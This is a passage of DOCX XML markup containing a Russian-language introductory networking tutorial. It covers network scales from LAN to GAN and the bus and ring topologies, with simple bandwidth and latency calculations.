      </w:pPr>
      <w:r>
        <w:t>**Офисная сеть**: 50 компов + 10 принтеров + 5 серверов + свитчи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компьютерный класс**: 30 компов, подключённых к одному свитчу</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Топология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Обычно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>звезда</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (все устройства подключены к центральному свитчу или роутеру).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример расчёта</w:t>
      </w:r>
      <w:r>
        <w:t>: В офисе 40 компов, каждый подключён к гигабитному свитчу (1 Гбит/с на порт). Все одновременно качают обновление Windows (каждому нужно 100 Мбит/с). Хватит ли пропускной способности?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Нужно} = 40 \times 100 = 4000 \text{ Мбит/с} = 4 \text{ Гбит/с}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">У свитча 40 портов × 1 Гбит/с = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>40 Гбит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> суммарной пропускной способности (если </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>non-blocking</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, т.е. backplane достаточно широкий). Так что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хватит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, но если у свитча backplane всего 20 Гбит/с, будет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bottleneck</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (узкое место).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.3. MAN (Metropolitan Area Network) — городская сеть</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сеть в пределах </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>города</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>района</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, до </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100 км</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптоволокно** — магистраль провайдера</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**WiMAX (Worldwide Interoperability for Microwave Access)** — беспроводная технология (сейчас устарела, вытеснена 4G/5G)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ethernet over Fiber** — подключение районов через оптику</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Средняя скорость**: 100 Мбит/с – 10 Гбит/с (для клиентов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка**: 1-10 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Владелец**: провайдер (Ростелеком, МГТС, Билайн)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сеть провайдера**: узлы связи в разных районах города, соединённые оптоволокном</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кабельное ТВ**: DOCSIS-сеть по коаксиалу на весь город</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Университетский кампус**: несколько зданий университета, соединённых оптикой</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не интернет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (интернет — это WAN), а сеть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одной организации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одного провайдера</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в пределах города.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.4. WAN (Wide Area Network) — глобальная сеть</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сеть в пределах </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>страны</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>континента</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Дальность от </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100 км</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> до </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>десятков тысяч км</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптоволокно** — подводные кабели (трансатлантические, транстихоокеанские)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Спутниковая связь** — для удалённых регионов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Магистральные каналы** — провайдеры уровня Tier 1 (AT&amp;T, Level 3, Cogent, Hurricane Electric)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Скорость**: 1-100 Гбит/с (для магистральных каналов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка**: 10-300 мс (зависит от расстояния)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Владельцы**: множество провайдеров, соединённых **пирингом** (peering)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интернет** — самая известная WAN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сеть корпорации**: офисы Microsoft в Сиэтле, Москве, Пекине, соединённые выделенными каналами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Банковская сеть**: филиалы Сбербанка по всей России, соединённые в одну сеть</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ты в Москве заходишь на сайт, хостящийся в Калифорнии (США). Данные летят через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WAN</w:t>
      </w:r>
      <w:r>
        <w:t>: Москва → Франкфурт → Нью-Йорк → Калифорния. Расстояние ~10,000 км, задержка ~120-150 мс (пинг).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёт задержки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Задержка (только распространение света)} = \frac{10000 \text{ км}}{200000 \text{ км/с}} = 0.05 \text{ с} = 50 \text{ мс}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Но к этому добавляются маршрутизаторы (обработка пакетов), очереди, буферы → реальный пинг </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100-150 мс</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.5. GAN (Global Area Network) — глобальная сеть планетарного масштаба</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сеть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>планетарного</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> масштаба. По сути, это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>интернет</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Все перечисленные выше** (LAN, MAN, WAN)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Подводные оптоволоконные кабели** — 99% трафика между континентами идёт по дну океанов (да, не через спутники!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Internet Exchange Points (IXP)** — точки, где провайдеры обмениваются трафиком (например, MSK-IX в Москве, DE-CIX во Франкфурте)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Скорость**: от 1 Мбит/с (для пользователя) до 400 Гбит/с (для магистральных каналов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка**: 1 мс (локально) до 500 мс (через спутник)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Количество устройств**: **миллиарды**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интернет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это сеть сетей. Твоя домашняя LAN → WAN провайдера → магистраль Tier 1 → подводный кабель → другая страна → дата-центр Google.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Забавный факт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если перерезать подводные кабели между континентами, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>интернет умрёт</w:t>
      </w:r>
      <w:r>
        <w:t>. Спутники не справятся с трафиком (слишком малая пропускная способность и большая задержка).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Итоговая таблица: сравнение типов сетей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Тип   | Дальность     | Скорость         | Задержка  | Пример                          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------|---------------|------------------|-----------|---------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| PAN   | 1-10 м        | 1-480 Мбит/с     | &lt;1 мс     | Bluetooth, USB                  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| LAN   | до 1-2 км     | 1-40 Гбит/с      | &lt;1 мс     | Офис, дом, школа                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| MAN   | до 100 км     | 100 Мбит/с–10 Гбит/с | 1-10 мс   | Сеть провайдера по городу       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| WAN   | 100 км – континенты | 1-100 Гбит/с     | 10-300 мс | Интернет, корпоративная сеть    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| GAN   | планетарный   | 1 Мбит/с – 400 Гбит/с | 1-500 мс  | Интернет                        |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Топологии сетей: как устройства соединены</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Топология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это схема соединения устройств в сети. Бывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>физическая</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (как кабели проложены) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>логическая</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (как данные передаются).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1. Шина (Bus) — все на одном проводе</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Все устройства подключены к </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одному общему кабелю</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (коаксиал). Сигнал распространяется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>по всей шине</w:t>
      </w:r>
      <w:r>
        <w:t>, и каждое устройство проверяет, адресован ли пакет ему.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Компьютер 1] —— [Компьютер 2] —— [Компьютер 3] —— [Компьютер 4]</w:t>
        <w:br/>
        <w:t xml:space="preserve">       |__________________|__________________|_____________|</w:t>
        <w:br/>
        <w:t xml:space="preserve">                          Общий кабель (шина)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t>: 10BASE2, 10BASE5 (Ethernet на коаксиале, 1980-е годы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дешевизна** — один кабель на всех</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Простота** — легко добавить новое устройство</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коллизии** — если два компа передают данные одновременно, пакеты сталкиваются</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Один разрыв — всё мертво** — если кабель порвался, вся сеть падает</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Низкая производительность** — все делят одну пропускную способность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Небезопасно** — все видят трафик всех (сниффинг)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Динозавр</w:t>
      </w:r>
      <w:r>
        <w:t>. Умерла в 1990-х. Если кто-то предлагает тебе шинную топологию — смейся ему в лицо и уходи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример расчёта</w:t>
      </w:r>
      <w:r>
        <w:t>: Шина 10BASE2 (10 Мбит/с). 5 компов одновременно передают данные. Какая скорость у каждого?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Скорость на комп} = \frac{10 \text{ Мбит/с}}{5} = 2 \text{ Мбит/с}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Но на практике будет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ещё хуже</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> из-за коллизий и повторных передач.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2. Кольцо (Ring) — хоровод данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Устройства соединены в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>замкнутый круг</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Данные идут </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>по кругу</w:t>
      </w:r>
      <w:r>
        <w:t>, от одного устройства к другому, пока не дойдут до получателя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">        [Компьютер 1]</w:t>
        <w:br/>
        <w:t xml:space="preserve">             |</w:t>
        <w:br/>
        <w:t xml:space="preserve">   [Компьютер 2]  ⟲  [Компьютер 4]</w:t>
        <w:br/>
        <w:t xml:space="preserve">             |</w:t>
        <w:br/>
        <w:t xml:space="preserve">        [Компьютер 3]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Token Ring** (IBM, 1985) — передача токена (специальный пакет), кто имеет токен — тот может передавать данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**FDDI (Fiber Distributed Data Interface)** — кольцо на оптоволокне, скорость 100 Мбит/с</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нет коллизий** — токен гарантирует, что только одно устройство передаёт данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Предсказуемая задержка** — каждый получает токен по очереди</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Один разрыв — всё мертво** (решается двойным кольцом, но дорого)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложность** — добавление/удаление устройства требует остановки сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка** — данные идут через все промежуточные устройства</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вымерла</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> к концу 1990-х. Вытеснена Ethernet (звезда).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сеть из 10 компов, кольцо FDDI (100 Мбит/с). Компьютер 1 отправляет данные компьютеру 6. Пакет идёт через компы 2, 3, 4, 5 → задержка </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>растёт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с количеством промежуточных узлов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3. Звезда (Star) — король современных сетей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Все устройства подключены к </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>центральному узлу</w:t>
      </w:r>
      <w:r>
